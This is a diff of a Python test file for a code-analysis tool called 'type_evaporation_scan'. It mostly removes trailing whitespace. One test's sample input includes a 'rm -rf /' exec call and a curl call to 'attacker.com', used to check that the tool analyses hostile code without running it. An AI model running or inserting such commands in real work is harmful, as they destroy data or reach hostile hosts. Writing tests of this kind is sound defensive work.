@@ -30,7 +30,7 @@ async def test_performance_small_input(tmp_path: Path):
     """Test performance with small input."""
     frontend_code = "const x = fetch('/api');"
     backend_code = "x = requests.get('/api')"
-    
+
     async with _stdio_session(project_root=tmp_path) as session:
         start = time.time()
         payload = await session.call_tool(
@@ -45,7 +45,7 @@ async def test_performance_small_input(tmp_path: Path):
 
     env_json = _tool_json(payload)
     data = _assert_envelope(env_json, tool_name="type_evaporation_scan")
-    
+
     # Small input should process quickly (< 5 seconds)
     assert elapsed < 5, f"Small input took {elapsed}s"
     assert data.get("success") in [True, False]
@@ -59,7 +59,7 @@ async def test_performance_medium_input(tmp_path: Path):
     backend_code = "\n".join(
         [f"def func{i}(): return requests.get('/api/users/{i}')" for i in range(100)]
     )
-    
+
     async with _stdio_session(project_root=tmp_path) as session:
         start = time.time()
         payload = await session.call_tool(
@@ -74,7 +74,7 @@ async def test_performance_medium_input(tmp_path: Path):
 
     env_json = _tool_json(payload)
     data = _assert_envelope(env_json, tool_name="type_evaporation_scan")
-    
+
     # Medium input should complete in reasonable time (< 30 seconds)
     assert elapsed < 30, f"Medium input took {elapsed}s"
     assert data.get("success") in [True, False]
@@ -91,7 +91,7 @@ fetch(url);
 user_id = request.args.get('id')
 response = requests.get(f'/api/users/{user_id}')
 """
-    
+
     results = []
     for _ in range(2):
         async with _stdio_session(project_root=tmp_path) as session:
@@ -107,7 +107,7 @@ response = requests.get(f'/api/users/{user_id}')
         env_json = _tool_json(payload)
         data = _assert_envelope(env_json, tool_name="type_evaporation_scan")
         results.append(data.get("success"))
-    
+
     # Should produce same result twice
     assert results[0] == results[1]
 
@@ -121,7 +121,7 @@ const x = require('child_process').exec('rm -rf /')
 import subprocess
 subprocess.run(['curl', 'http://attacker.com'])
 """
-    
+
     async with _stdio_session(project_root=tmp_path) as session:
         payload = await session.call_tool(
             "type_evaporation_scan",
@@ -134,7 +134,7 @@ subprocess.run(['curl', 'http://attacker.com'])
 
     env_json = _tool_json(payload)
     data = _assert_envelope(env_json, tool_name="type_evaporation_scan")
-    
+
     # Should analyze without executing
     assert isinstance(data, dict)
     assert data.get("success") in [True, False]
@@ -153,7 +153,7 @@ const request = fetch('/api/data', {{
 api_key = "{secret_api_key}"
 response = requests.get('/api/data', headers={{'Authorization': f'Bearer {{api_key}}'}})
 """
-    
+
     async with _stdio_session(project_root=tmp_path) as session:
         payload = await session.call_tool(
             "type_evaporation_scan",
@@ -166,7 +166,7 @@ response = requests.get('/api/data', headers={{'Authorization': f'Bearer {{api_k
 
     env_json = _tool_json(payload)
     data = _assert_envelope(env_json, tool_name="type_evaporation_scan")
-    
+
     # Secret should not leak in response
     response_str = str(payload)
     assert secret_api_key not in response_str
@@ -184,7 +184,7 @@ async def test_error_recovery_from_invalid_input(tmp_path: Path):
             },
             read_timeout_seconds=timedelta(seconds=120),
         )
-        
+
         # Send valid input
         payload2 = await session.call_tool(
             "type_evaporation_scan",
@@ -197,11 +197,11 @@ async def test_error_recovery_from_invalid_input(tmp_path: Path):
 
     env_json1 = _tool_json(payload1)
     env_json2 = _tool_json(payload2)
-    
+
     # Both should complete
     data1 = _assert_envelope(env_json1, tool_name="type_evaporation_scan")
     data2 = _assert_envelope(env_json2, tool_name="type_evaporation_scan")
-    
+
     assert isinstance(data1, dict)
     assert isinstance(data2, dict)
 
@@ -209,8 +209,10 @@ async def test_error_recovery_from_invalid_input(tmp_path: Path):
 async def test_graceful_oversized_input(tmp_path: Path):
     """Test graceful handling of very large input."""
     # Create input with 10000 properties
-    huge_code = "const obj = { " + ", ".join([f"key{i}: {i}" for i in range(5000)]) + " };"
-    
+    huge_code = (
+        "const obj = { " + ", ".join([f"key{i}: {i}" for i in range(5000)]) + " };"
+    )
+
     async with _stdio_session(project_root=tmp_path) as session:
         payload = await session.call_tool(
             "type_evaporation_scan",
@@ -223,7 +225,7 @@ async def test_graceful_oversized_input(tmp_path: Path):
 
     env_json = _tool_json(payload)
     data = _assert_envelope(env_json, tool_name="type_evaporation_scan")
-    
+
     # Should handle gracefully
     assert isinstance(data, dict)
 
@@ -232,7 +234,7 @@ async def test_unicode_handling(tmp_path: Path):
     """Test Unicode character handling."""
     frontend_code = 'const message = "Hello 世界 مرحبا"; fetch("/api");'
     backend_code = 'message = "Hello 世界 مرحبا"; requests.get("/api")'
-    
+
     async with _stdio_session(project_root=tmp_path) as session:
         payload = await session.call_tool(
             "type_evaporation_scan",
@@ -245,7 +247,7 @@ async def test_unicode_handling(tmp_path: Path):
 
     env_json = _tool_json(payload)
     data = _assert_envelope(env_json, tool_name="type_evaporation_scan")
-    
+
     # Should handle Unicode without issues
     assert data.get("success") in [True, False]
 
@@ -254,7 +256,7 @@ async def test_path_traversal_safety(tmp_path: Path):
     """Test that path traversal in filenames doesn't bypass safety."""
     frontend_code = "const x = 1;"
     backend_code = "x = 1"
-    
+
     async with _stdio_session(project_root=tmp_path) as session:
         payload = await session.call_tool(
             "type_evaporation_scan",
@@ -269,6 +271,6 @@ async def test_path_traversal_safety(tmp_path: Path):
 
     env_json = _tool_json(payload)
     data = _assert_envelope(env_json, tool_name="type_evaporation_scan")
-    
+
     # Should process safely
     assert isinstance(data, dict)
